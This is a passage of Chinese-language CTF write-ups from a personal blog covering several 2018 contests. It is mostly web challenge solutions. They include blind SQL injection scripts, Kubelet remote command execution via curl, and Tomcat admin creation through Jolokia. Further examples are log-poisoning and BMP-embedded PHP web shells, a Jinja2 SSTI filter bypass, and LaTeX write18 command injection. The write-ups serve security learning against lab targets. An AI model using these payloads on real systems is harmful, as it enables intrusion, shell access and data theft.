'id='+id+'title='+title+'author='+author+'date='+date+'time='+t+'adrefkfweodfsdpiru' sig = hashlib.sha1(str0).hexdigest() ip = '123.232.23.245' headers = &#123;'X-Originating-IP': ip, 'X-Forwarded-For': ip, 'X-Remote-IP': ip, 'X-Remote-Addr': ip, 'X-Client-IP': ip, \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36\", 'Referer':\"http://123.232.23.245/\" &#125; if len(requests.post(url=\"http://116.85.43.88:8080/NQYPTEMNWRQIYLEP/dfe3ia/index.php?sig=\"+sig+\"&amp;time=\"+str(int(time.time())),data=data,headers=headers).content) != 2420: s += chr(i) break print s # print str0 way2溢出绕过waf 然后直接union查询 这个方法以前也是见过的 但没真正用过 做题时还真想不起来 回头看了一下 2017swpu上偷懒的出题人那道就是用溢出waf做的 web2直接看源码 发现一个比较奇怪的连接 将ZmF2aWNvbi5pY28= base64解码后，发现是favicon.ico 初步判断该api应该存在任意文件下载漏洞 尝试读取 web.xml ../../WEB-INF/web.xml成功 ../../多于两个时会报错 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647HTTP Status 500 – Internal Server ErrorType Exception ReportMessage Request processing failed; nested exception is java.lang.NullPointerExceptionDescription The server encountered an unexpected condition that prevented it from fulfilling the request.Exceptionorg.springframework.web.util.NestedServletException: Request processing failed; nested exception is java.lang.NullPointerException org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:978) org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:857) javax.servlet.http.HttpServlet.service(HttpServlet.java:634) org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:842) javax.servlet.http.HttpServlet.service(HttpServlet.java:741) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53) org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:88) org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)Root Causejava.lang.NullPointerException java.base/java.io.File.&lt;init&gt;(File.java:276) com.didichuxing.ctf.controller.user.StaticController.getImage(StaticController.java:39) jdk.internal.reflect.GeneratedMethodAccessor124.invoke(Unknown Source) java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) java.base/java.lang.reflect.Method.invoke(Method.java:564) org.springframework.web.method.support.InvocableHandlerMethod.invoke(InvocableHandlerMethod.java:215) org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:132) org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:104) org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandleMethod(RequestMappingHandlerAdapter.java:781) org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:721) org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:83) org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:943) org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:877) org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:966) org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:857) javax.servlet.http.HttpServlet.service(HttpServlet.java:634) org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:842) javax.servlet.http.HttpServlet.service(HttpServlet.java:741) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53) org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:88) org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)Note The full stack trace of the root cause is available in the server logs.Apache Tomcat/9.0.5 web3源码中有提示 big5编码 找一个big编码的字，第二位字节为 0x5c 即 \\ 转义掉gpc生成的 \\ 最后成功逃逸单引号 \\‘ 常规注入后拿到备份文件地址 然后反序列化 web4区块链的题。。很有趣 话说*ctf上又出了个区块链的题 感觉这是个趋势啊 https://xz.aliyun.com/t/2299 看懂了大致思路 web5随机数预测 sprinf函数漏洞 bctf奇葩的比赛 题目多时间短 web sqln1ctf 上sql1 sql2的增强版 当时n1ctf的出题人赛后就说过 sql1 2都不是他设想的预期解 要再出3 就放在了这里 题目和当时的sql1 2 都差不多 waf狠了点 并且这次 point作为盲注的回显位也没了 那么一般的盲注思路就行不通了 然后我还试了波 oob 然而并没有什么用 所以唯一的回显处就是当语句执行错误是回显的 sorry 发现if还在 那么思路就是找个报错的语句 用的是 pow(2,2222222222222222) 数字上除了2和9都waf掉了 稍微试了下 应该是字母 注意这里是无法分辨大小写的 就是&gt;h 或&gt;H等价 1234567891011121314#encoding=utf8import requests, stringstr_range = string.ascii_lettersurl = \"http://3a7b823fc7994d62a92c3589fd05273b1254bc38b97743f2.game.ichunqiu.com\"for i in str_range: data = dict(flag=2,hi=\"&gt;&gt;if((substr(pw,2*2*2*2*2-9-2,(9-2-2-2-2))&gt;'&#123;&#125;'),2,pow(22,222222222222))\".format(i)) r = requests.post(url, data=data) if 'sorry' in r.text: print('sorry',i) elif 'hacker' in r.text: print(\"hacker\") else: print(\"yes\",i) j和J waf了 但还好flag的字母都在j之前 要不脚本还真不好自动化 1234567891011121314151617181920212223242526#encoding=utf8import requests, string#str_range = string.ascii_lettersstr_range = \"abcdefghijklmnopqrstuvwxyz\"url = \"http://d916447074bd4c5e9386a80dd0f78c9fafa5faaff49545c3.game.ichunqiu.com/\"fflag=\"\"for j in range(1,500): for i in str_range: payload = \"&gt;&gt;if(pw&gt;'%s',2,pow(2,22222222222))\"%(fflag+i) data = &#123; \"flag\":\"2\", \"hi\":payload &#125; r = requests.post(url, data=data) if 'sorry' in r.text: fflag += chr(ord(i)-1) print fflag #跑出来的flag最后一位ascii要加1 break #用&amp;&amp;不行 一直不报sorry 甚至 waf都不拦了 但是没啥用#脚本不能区分大小写 写完这个脚本我也终于懂了为啥这种方法最后一位ascii要加1 当比较位数不是最后一位时 ascii-1其实就刚好是自己 比如 cccccc &gt; c 正确 cccccc &gt; d 错误 而当比较到最后一位时 是不用在-1的 但脚本多-1 所以最后一位要+1 比如 cccccc &gt; cccccc 就错误 再-1就多减了 *ctfweb感觉是个数学题 Orz.. misc chess国际象棋题。。。 了解到了 py 的 stockfish 还有的大佬开局三部杀手动下完了20把","categories":[{"name":"writeup","slug":"writeup","permalink":"http://Merl1ng.com/categories/writeup/"}],"tags":[{"name":"misc","slug":"misc","permalink":"http://Merl1ng.com/tags/misc/"},{"name":"web","slug":"web","permalink":"http://Merl1ng.com/tags/web/"}]},{"title":"hitbwp","slug":"hitbwp","date":"2018-04-14T05:10:27.000Z","updated":"2018-05-04T15:03:21.924Z","comments":true,"path":"2018/04/14/hitbwp/","link":"","permalink":"http://Merl1ng.com/2018/04/14/hitbwp/","excerpt":"赛后学习","text":"赛后学习 首先是两道渗透题 学习思路orz baby babyhttps://ricterz.me/posts/Security%20Issues%20of%20Kubelet%20HTTP%28s%29%20Server这题出题人的blog直接有题解。。。 This is a pentest challenge, target 47.75.146.42 题目直接说了 渗透 扫端口 nmap -p- 47.75.146.42 PORT STATE SERVICE22/tcp open ssh80/tcp open http443/tcp closed https2333/tcp closed snapp3389/tcp closed ms-wbt-server8009/tcp closed ajp139999/tcp open abyss10250/tcp open unknown 尝试9999 curl 好像可以拿到一个假的一句话 没啥用 尝试10250 curl -k https://47.75.146.42:10250 404错误 curl -k https://47.75.146.42:10250/stats/ { “name”: “/“, “subcontainers”: [ { “name”: “/docker” }, { “name”: “/kubepods” }, { “name”: “/system.slice” }, { “name”: “/user.slice” } ], “spec”: { “creation_time”: “2018-04-13T04:42:43.504+08:00”, “has_cpu”: true, “cpu”: { “limit”: 1024, “max_limit”: 0,… 可以看出来是 Kubelet service github搜一下exp https://github.com/kayrus/kubelet-exploit 可以看到需要 namespace, pod name, container name 这三个参数 由于返回的数据是json 采用 jq命令 https://www.ibm.com/developerworks/cn/linux/1612_chengg_jq/index.html?ca=drs-&amp;utm_source=tuicool&amp;utm_medium=referral curl -k https://47.75.146.42:10250/runningpods/ | jq … { “metadata”: { “name”: “web-test-4092782360-035qx”, “namespace”: “esn-system”, “uid”: “a8f7e307-3e14-11e8-838a-00163e0245e7”, “creationTimestamp”: null }, “spec”: { “containers”: [ { “name”: “web-test”, “image”: “127.0.0.1:5000/esn-containers/web_test@sha256:ae129fcd94bd2978db37050f95c62311f5bf9fdbba25817e6e8a098db3a168cf”, “resources”: {} } ] }, “status”: {} }, 可以看出 Namespace: esn-systemPod Name: web-test-4092782360-035qxContainer Name: web-test curl -k -XPOST “https://k8s-node-1:10250/run/kube-system/node-exporter-iuwg7/node-exporter“ -d “cmd=ls -la /“ curl -k -XPOST \\”https://47.75.146.42:10250/run/esn-system/web-test-4092782360-035qx/web-test“ -d “cmd=cat /flag.txt” way2 pip一个httpie 在window下和curl差不多 http –verify=no https://47.75.146.42:10250/runningpods/ http –form –verify=no POST https://47.75.146.42:10250/run/esn-system/web-test-4092782360-035qx/web-test cmd=’ls /‘ http –form –verify=no POST https://47.75.146.42:10250/run/esn-system/web-test-4092782360-035qx/web-test cmd=’cat /flag.txt’ Baby Nyahttps://ricterz.me/posts/Exploiting%20Jolokia%20Agent%20with%20Java%20EE%20Servers出题人那也有大致的解法。。。 还是渗透 Nya Nya Nya, target: 47.75.128.216 hint : the tomcat deployed jolokia.war 扫描端口nmap -p- -A 47.75.128.216 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 37:1b:36:12:eb:cd:b3:f6:d5:b7:06:e0:7d:c9:61:00 (RSA)| 256 bf:76:6f:85:2a:c3:82:75:66:97:74:5e:c5:87:e2:42 (ECDSA)80/tcp closed http443/tcp closed https2333/tcp closed snapp3389/tcp closed ms-wbt-server8009/tcp open ajp13 Apache Jserv (Protocol v1.3)| ajp-methods:| Supported methods: GET HEAD POST PUT DELETE OPTIONS| Potentially risky methods: PUT DELETE| See https://nmap.org/nsedoc/scripts/ajp-methods.html9999/tcp open http nginx 1.10.3 (Ubuntu)|_hadoop-datanode-info:|_hadoop-jobtracker-info:|_hadoop-tasktracker-info:|_hbase-master-info:|_http-server-header: nginx/1.10.3 (Ubuntu)|_http-title: Site doesn’t have a title (application/octet-stream).10250/tcp closed unknown 发现 8009 the Apache JServ Protocol server github 搜一下ajphttps://github.com/hypn0s/AJPy 并且结合提示 the tomcat deployed jolokia.war 考虑利用 jolokia python tomcat.py -t 47.75.128.216 req -m GET /jolokia | jq way 2 这个题其实有个很坑的地方 就是直接访问端口是看不到页面的 这是因为Apache JServ协议（AJP）本质上是一个优化的HTTP二进制版本。这使得使用传统工具很难与AJP端口进行通信。最简单的解决方案是将Apache配置为本地代理 所以你要在本地配置一波才能访问到题目的8009端口 详细看https://ionize.com.au/exploiting-apache-tomcat-port-8009-using-apache-jserv-protocol/ 然后再根据出题人rr大佬的文章添加一个admin 然后在用你创建的账号登陆 123456789101112131415161718192021// 创建 manager-gui&#123; \"type\": \"EXEC\", \"mbean\": \"Users:database=UserDatabase,type=UserDatabase\", \"operation\": \"createRole\", \"arguments\": [\"manager-gui\", \"\"]&#125;// 创建用户&#123; \"type\": \"EXEC\", \"mbean\": \"Users:database=UserDatabase,type=UserDatabase\", \"operation\": \"createUser\", \"arguments\": [\"test233\", \"test233\", \"\"]&#125;// 增加角色&#123; \"type\": \"EXEC\", \"mbean\": \"Users:database=UserDatabase,type=User,username=\\\"test233\\\"\", \"operation\": \"addRole\", \"arguments\": [\"manager-gui\"]&#125; 然后在这个页面就可以看到flag/manager/html Upload很明显要上传文件 getshell 有两个页面 一个上传文件 随便传个试下 上传后会被自动命名 名字可以看到 注释里还有一个pic.php?filename=default.jpg 图片存在的话会返回图片大小 否则报错 抓包可以看到 HTTP/1.1 200 OKContent-Type: text/html; charset=UTF-8Server: Microsoft-IIS/7.0X-Powered-By: PHP/5.6.35Date: Fri, 13 Apr 2018 13:30:00 GMTConnection: closeContent-Length: 18 IIS/7.0 这里需要windows的文件上传技巧 1.php(空格)会变成1.php 这样就可以成功上传php文件 (先输入需要输入的文件名字 输入完后按住键盘上的Alt键不放 然后依次在小键盘上输入0160（输这4个数字时候是看不见他们的） 输完后放开Alt键) 但没有文件夹的路径。。。 所以考虑另一个功能 pic.php?filename=default.jpg 随便传一张图片 得到一个名字 然后根据回显采用通配爆破 pic.php?filename=../PATH&lt;&lt;/1523687928.jpg 拿到目录名 87194f13726af7cee27ba2cfe97b60df 然后传一句话就可以愉快地getshell了 view-source:http://47.90.97.18:9999/87194f13726af7cee27ba2cfe97b60df/1523653724.PHP?cmd=foreach%20(glob(%22../flag*%22)%20as%20%24filename)%20%7B%20echo%20%22%24filename%20%3D%3E%20%22%3Bvar_dump(file_get_contents(%24filename))%3B%20%7D 右键源码看到flag 这题回过来看好简单。。。。。膨胀了 orz 参考wphttps://nandynarwhals.org/hitbgsecquals2018-upload/ 还有复现下来感觉信息收集的作用真的很大 python revenge和强网杯py2有些类似 (都是fp出的 最近太忙了 等有时间这三个py一起分析一遍(","categories":[{"name":"writeup","slug":"writeup","permalink":"http://Merl1ng.com/categories/writeup/"}],"tags":[{"name":"misc","slug":"misc","permalink":"http://Merl1ng.com/tags/misc/"},{"name":"web","slug":"web","permalink":"http://Merl1ng.com/tags/web/"}]},{"title":"近期ctf杂记","slug":"近期ctf杂记","date":"2018-04-07T04:57:34.000Z","updated":"2018-07-31T13:12:34.298Z","comments":true,"path":"2018/04/07/近期ctf杂记/","link":"","permalink":"http://Merl1ng.com/2018/04/07/近期ctf杂记/","excerpt":"sunshine ctf + Byte ctf + INS’hAck ctf + swamp ctf","text":"sunshine ctf + Byte ctf + INS’hAck ctf + swamp ctf sunshine ctf来自佛罗里达的game web非常友好hhh web 50命令注入 原题。。。 1234567 &lt;?php include \"flag.php\";error_reporting(0);show_source(__FILE__);$a = @$_REQUEST['hello'];eval(\"var_dump($a);\");?&gt; payload : 1?hello=$a);print_r(file(\"./flag.php\")); // 如果搭在linux下 还可以 1?hello=);echo%20`cat%20./flag.php`;// 详细可以看当时的原题题解。。 https://blog.csdn.net/qq_35078631/article/details/62438259 web 100提示flag在源码里 和 Hint 2018-04-06 00:20 UTC: There are many different types of MIMEs, but only a handful were truly legendary… 但直接打开查看源码没有flag 抓包看了下 mime 是 text/html 题目又说了是php源码 随手搜了下 改包即可 text/php web 150Ip 改成本地 127.0.0.1 web 200仿lctf2017的一道题 让你输入一个网址 url必须是 www.google.com 否则报错 lctf是baidu…. 两种方法 misc 100.git git log 发现一共有三个版本 最开始我还以为是找不同。。 我以为 bobby is vegan 就是flag…….交了半天不对 git reset –hard xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 分别还原 注意这里要在最外层文件夹下输入 还原后发现仍然找不到 flag 可以 git cat-file -p [SHA1] 一个一个看 但是搜到了 git fsck 这个检查指令 拿到了一个没还原出的的版本 仍然reset –hard 即可看到flag 做题时搜到的两篇文章 https://blog.csdn.net/xiaotaode2012/article/details/77285036 http://www.slmt.tw/blog/2016/08/22/dont-expose-your-git-dir/ misc 150给了一个视频 binwalk看了下啥都有 提取了一张图片试了试没啥用 由于是mp4文件 想到了ffmpeg这个工具 以前看过一道题是截取图片然后XOR 这题显然不是。。 耐心地播放视频 大概在2:20时可以发现音频缺失 把音频提取出来 ffmpeg -i OldFavorites.mp4 OldFavorites.wav 再看频谱即可 Byte ctfweb 100查看下页面源码 123456789101112131415161718192021222324252627282930313233343536373839&lt;script type=\"text/javascript\" charset=\"utf-8\" async defer&gt; $(document).ready(function()&#123; $(\".b\").click(function()&#123; var v=parseInt(this.value); var object=&#123;\"id\":v&#125;; $.ajax(&#123; type: 'POST', url: 'El_Lazo/api/', contentType: 'application/json; charset=utf-8', dataType: 'json', data:JSON.stringify(object), success:function (res) &#123; console.log(res); $('#message').html(res.msg); &#125; &#125;); // $.post('/api/', &#123;\"id\":v&#125;,function(data)&#123; // $(\"#message\").html(data.msg); // &#125;); &#125;);&#125;);&lt;/script&gt;&lt;body&gt; &lt;h1&gt; Contrapasso&lt;/h1&gt; &lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;button class=\"b\" type=\"button\" value=2&gt;Pedro&lt;/button&gt; &lt;button class=\"b\" type=\"button\" value=3&gt;Maria&lt;/button&gt; &lt;button class=\"b\" type=\"button\" value=4&gt;Gonzalez&lt;/button&gt; &lt;p id=\"message\"&gt;&lt;/p&gt;&lt;/body&gt; 发现有 2 3 4 那么应该有 1 才对 但是页面里没有1的按钮 抓包看看 12345678910111213POST /El_Lazo/api/ HTTP/1.1Host: web.euristica.inUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateReferer: http://web.euristica.in/El_LazoContent-Type: application/json; charset=utf-8X-Requested-With: XMLHttpRequestContent-Length: 8Connection: close&#123;\"id\":2&#125; 现在思路就很清晰了 把1改成2即可 但是直接改还不行 {“id”:1}{“msg”:”You are not authorized to view that message”} 带上”” 改包发包即可{“id”:”1”}{“msg”:”flag{Y0u_c4n_c4ll_m3_law3r3nce3}”} web 200很明显的一个文件包含 index.php被过滤了 http://web.euristica.in/R3M3MB3R/index.php?f=php://filter/read=convert.base64-encode/resource=eg.php 这样可以下载那个播视频的页面 但是并没啥用 尝试几个 /etc/passwordroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/bin/falseappuser:x:1001:1001::/home/appuser: /etc/os-release: Debian GNU/Linux 9 (stretch)/proc/self/status: apache2/proc/self/fd/2: logs, same as /var/log/apache2/error.log/etc/apache2/envvars: default environment variables for apache2ctl/etc/apache2/sites-enabled/000-default.conf: vhost config/proc/self/fd/7: logs, same as /var/log/apache2/access.log 这个很有用 我们希望写入一句话进行包含 access.log 包含User-Agent所请求的每个页面 因此如果我们在User-Agent HTTP头中注入PHP payload 就可以写进 access.log文件 改包 &lt;?php system($_GET[‘c’]); ?&gt; 在 User-Agent 并且and requested c=ls -lA12345678GET /R3M3MB3R/index.php?f=/proc/self/fd/7&amp;c=ls%20%2dlAR HTTP/1.1Host: web.euristica.inUser-Agent: Mozilla/5.0 &lt;?php system($_GET['c']); ?&gt; Gecko/20100101 Firefox/59.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1 /var/log/apache2/access.log 日志文件 还有其他写法 1234GET /R3M3MB3R/index.php?f=../../../../../../../var/log/apache2/access.log HTTP/1.1Host: web.euristica.inUpgrade-Insecure-Requests: 1User-Agent: &lt;?php system('ls /var/www/html/');?&gt; 然后 1234GET /R3M3MB3R/index.php?f=../../../../../../../var/log/apache2/access.log HTTP/1.1Host: web.euristica.inUpgrade-Insecure-Requests: 1User-Agent: &lt;?php system('cat /var/www/html/*');?&gt; 话说加不加../../../../进行目录穿越在这里好像没啥影响 web 400查看网站参数可能是注入 实际上是 Jinja2 ssti模板注入 但是进行了一些过滤 但但是过滤的地方可以用 + 来绕过 之前看过ssti的文章 http://klaus.link/2017/Flask_SSTI/ 首先试一下1234567891011&#123;&#123;7*7&#125;&#125;``` 可以 ```bash&#123;&#123;'7'*7&#125;&#125;``` 也可以 尝试```bash&#123;&#123; ''.class.mro[2].subclasses()[40]('/etc/passwd').read() &#125;&#125; 不行 class mro等被过滤 可以绕过1&#123;&#123;''['__cla'+'ss__']['__mr'+'o__'][2]['__subcla'+'sses__']()[40]('fl'+'ag', 'r').read()&#125;&#125; 再url编码一下 1http://web.euristica.in/hard_to_hack/index?data=%7B%7B%27%27%5B%27__cla%27%2B%27ss__%27%5D%5B%27__mr%27%2B%27o__%27%5D%5B2%5D%5B%27__subcla%27%2B%27sses__%27%5D()%5B40%5D(%27fl%27%2B%27ag%27%2C%20%27r%27).read()%7D%7D payload参考 http://jinja.pocoo.org/docs/2.10/templates/ 另一个payload1&#123;&#123;(((((request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a)))|attr(request.args.m|format(request.args.a,request.args.a,request.args.a,request.args.a)))[8])|attr(request.args.k|format(request.args.a,request.args.a,request.args.a,request.args.a))())[40])(%27flag%27).read()&#125;&#125;&amp;f=%s%sclass%s%s&amp;a=_&amp;m=%s%smro%s%s&amp;k=%s%ssubclasses%s%s 这个我是没看懂 但是这种如果黑名单第一种方法就gg了 这种还可以 另一个大佬的解法 https://fadec0d3.blogspot.com/2018/04/byte-bandits-ctf-2018-hardtohack-400.html 也还没看懂 INS’hAck ctfweb 20有一个登陆框和一个找回密码框 题目说密码是密码+盐md5 但是我们没有盐 猜测sql注入 很容易想到sql在找回界面 常规sql 有回显的 1 说你没注册1’ 报错1 ‘||1# 或者 1 ‘or 1=1#1 ‘union select database()# db1 ‘ UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables where table_schema =’db’# users1 ‘ UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns where table_schema =’db’# userID,username,pass_salt,pass_md5,hint1 ‘ UNION SELECT username FROM users# 有好几个 结合题目中人名知是 c.hackle1 ‘ UNION SELECT pass_salt FROM users where username=’c.hackle’#1 ‘ UNION SELECT pass_md5 FROM users where username=’c.hackle’# 当然你也可以直接sqlmap sqlmap.py -u https://crimemail.ctf.insecurity-insa.fr/hint.php –data=”username=C” 最后 ./hashcat -a 0 -m 10 f2b31b3a7a7c41093321d0c98c37f5ad:yhbG rockyou.txt 或者py脚本 12345678import hashlibpasslist = open(\"/xxx/rockyou.txt\", 'r')for password in passlist: m = hashlib.md5() m.update(password[:-1] + \"yhbG\") if m.hexdigest() == \"f2b31b3a7a7c41093321d0c98c37f5ad\": print 'FOUND:' + password 话说现在sql分这么低的吗… swampctfweb 103爆破hash 抓包发现一个hash是真正的 一个是我们输密码的 那么思路很简单 碰撞直到我们输入的密码加密后的hash与真正的相同 这个密码就是真正的密码 Pragyan CTFweb 150https://ctf-writeups.ru/2k18/pragyan-ctf-2018/authenticate-your-way-to-admin/ web 200https://fireshellsecurity.team/pragyan-eleet-articles-hub/","categories":[{"name":"writeup","slug":"writeup","permalink":"http://Merl1ng.com/categories/writeup/"}],"tags":[{"name":"misc","slug":"misc","permalink":"http://Merl1ng.com/tags/misc/"},{"name":"web","slug":"web","permalink":"http://Merl1ng.com/tags/web/"}]},{"title":"nuitduhackwp","slug":"nuitduhackwp","date":"2018-04-01T14:19:18.000Z","updated":"2018-05-04T14:47:22.518Z","comments":true,"path":"2018/04/01/nuitduhackwp/","link":"","permalink":"http://Merl1ng.com/2018/04/01/nuitduhackwp/","excerpt":"法国年度ctf资格赛 web题很有趣","text":"法国年度ctf资格赛 web题很有趣 coingame curl 页面 试了试lctf中的 host技巧 没用。。https://blog.pwnhub.cn/2017/11/22/LCTF-2017-%E5%AE%98%E6%96%B9Writeup/#签到题 然后试了试dnslog curl http://ip.port.domain.ceye.io/`whoami` 能打回来解析但是命令不执行 也没用 页面里有Designed by totheyellowmoon 上github搜一下 发现了https://github.com/totheyellowmoon/CoinGame 而且有提示说第一步对了 看来走对了方向 Congrats it was the first step ! Welcome on my Github, this is my new game but I haven’t pushed the modifications … 还提示他没改东西 试了试file:///etc/password 看到开启了 tftp 那么就试一下 http://coingame.challs.malice.fr/curl.php?way=tftp://127.0.0.1/README.md 成功读取文件 与github上比对发现一样 这时思路就出来了 比对每一个文件 不一样的那个里就藏了flag 写脚本 大概思路是 python读本地所有文件名 爬对应的所有连接 下载服务器文件 与本地同名文件分别进行sha1/md5比对 打印出差异文件名 file协议也可以下载全部文件 file:///home/CoinGame/TouchMonsterFiles.py file:///home/CoinGame/ list里放所有文件名称 123456789101112131415161718192021222324import osimport wgeturl = 'http://coingame.challs.malice.fr/curl.php?way=file:///home/CoinGame/'#url = 'http://coingame.challs.malice.fr/curl.php?way=tftp://127.0.0.1/'out = '/tmp/out/'with open('list') as f: # create the directories for line in f: dirname = os.path.dirname(out + line) if not os.path.exists(dirname): try: os.makedirs(dirname) except Exception as e: pass with open('list') as f: # download the files for line in f: line = line.rstrip() try: wget.download(url + line, out=out + line) except Exception as e: print(e) pass 下载到本地后用比对脚本进行比对 tftp不是很了解 试了试127.5.5.5等 内网的好像都可以 127.0.0.0不行 192 和10 的好像也不行 0.0.0.0不行 Crawl me maybe! 有一个框可以输入 url 试了试只能输https的 http会报无效 试试目录穿越 要抓包改 不然网页太卡没回显 如果有真正网站的url会一直报错没回显 所以url不填 直接 url=|cat ../../../../../../../etc/passwd |必须要加 url=| ls -la ../../../../../home/challenge/ la前多了个空格就不一样 这点不是很懂不加空格输出的更全一点 url=| ls - la ../../../../../home/challenge/ la url=| ls -la ../../../../../../../../../home/challenge/src/ 看到了flag.txt url=| ls - la ../../../../../../../../../home/challenge/src/ 同上la前多了个空格就不一样 这个是看ruby爬虫url=| echo $(cat ../../../../../home/challenge/src/CrawlMeMaybe.rb) 直接读flag.txt会被ban url=| echo $(cat ../../../../../home/challenge/src/flag.txt) 从读取的crawlmemaybe脚本里可以看到过滤了flag字符串 要绕一圈访问flag.txturl=| cat ../../../../../home/challenge/src/“$(ls -1art ../../../../../home/challenge/src/ | tail -n4 | head -n1)” 也可以 不过这样要等一段时间url=|find ../../../../../home/challenge/src/ -exec cat {} \\; Linked Out 提交yaml网页会生成pdf 给了项目的github地址 https://github.com/posquit0/Awesome-CV 浏览一下github可以发现 .tex 说明它是基于latex的 所以我们试着执行latex命令 latex格式 \\twitter{@twit}\\skype{skype-id}\\reddit{reddit-id}\\extrainfo{extra informations} 试一下skype: BBBBBBBBBBBBBB}\\skype{AAAAAAAAAA 显示出了AAAAA 说明成功注入 skype: BBBBBBBBBBBBBB}\\skype{\\input|”ls *”}%%是注释 联想sql里面的 直接猜flagskype: BBBBBBBBBBBBBB}\\skype{\\input|”base64 /flag”}% 使用latex里“immediate”和“write18”语句来执行shell命令：这种比较稳 可以看到flag在当前目录skype: BBBBBBBBBBBBBB}\\skype{\\immediate\\write18{ls /|base64 &gt; toto}\\input{toto} skype: BBBBBBBBBBBBBB}\\skype{\\immediate\\write18{cat /flag|base64 &gt; toto}\\input{toto} PixEditor 抓个包可以看到图片的发送形式 这就意味着上传的图片内容是我们可控的 但是后缀只有规定的四种 一般的%00截断都没有用 浏览源码可以看到js 点进去看下发现文件名在超过50时会被截断 这样我们便可上传php文件 在其中包含一句话木马 123456789101112131415161718192021222324252627282930313233343536373839import requestss = requests.session()LINK = \"http://pixeditor.challs.malice.fr/\"# payload = \"&lt;?php phpinfo(); ?&gt;\"payload = \"&lt;?php $_GET['fn']($_GET['arg']); ?&gt;\"payload += \" \"*(3-(len(payload)%3)%3) # Multiple of 3 ! Pad with spacechunk = \"\"PXSIZE = int(len(payload)/3)for i in range(0,len(payload),3): # Chunk BMP : B V R A, B V R A chunk += str(ord(payload[i+2])) # Letter 3 chunk += \",\" chunk += str(ord(payload[i+1])) # Letter 2 chunk += \",\" chunk += str(ord(payload[i])) # Letter 1 chunk += \",255,\" # Apx = \"0,0,0,255,\"*((32*32)-PXSIZE) # PAD for a 32*32 imagepx = px[:-1]l = chunk+pxdico = &#123; \"data\" : \"[\"+l+\"]\", \"name\" : \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.php.BMP\", # Truncation \"format\" : \"BMP\"&#125;r = s.post(LINK+\"save.php\",data=dico) # Post payloadr = r.text.split(\"href='\")[1].split(\"'\")[0] # Get the uploaded image linkwebshell = LINK+rprint(\"WebShell at: \"+webshell+\"?fn=&amp;arg=\")r = s.get(webshell+\"?fn=system&amp;arg=ls -la /\")print(r.text)r = s.get(webshell+\"?fn=system&amp;arg=cat /flag\")print(r.text) # Congratz. The flag is : NDH&#123;Msp4int.3x3&gt;all&gt;th3g1mp&#125; 跑脚本(要挂ss)即可拿到flag Race Against The Machine看题目名大概就是条件竞争 题目大意是刚开始你有1000 要买机票 每个用户都可以而且仅购买一次打折机票 当你购买打折机票时 会返还50%的金额 最终要去维加斯需要1400 所以我们的思路就因此，我们必须创建大量用户（超过可用门票数量），然后同时发起购买请求，其中一些用户将进入购买流程，接受促销但不能购买票据，因为没有足够的机票票可用。这些用户将拥有1450英里的余额，并可以购买拉斯维加斯的机票 就算知道思路 脚本感觉还是不好写。。 贴个dalao的脚本 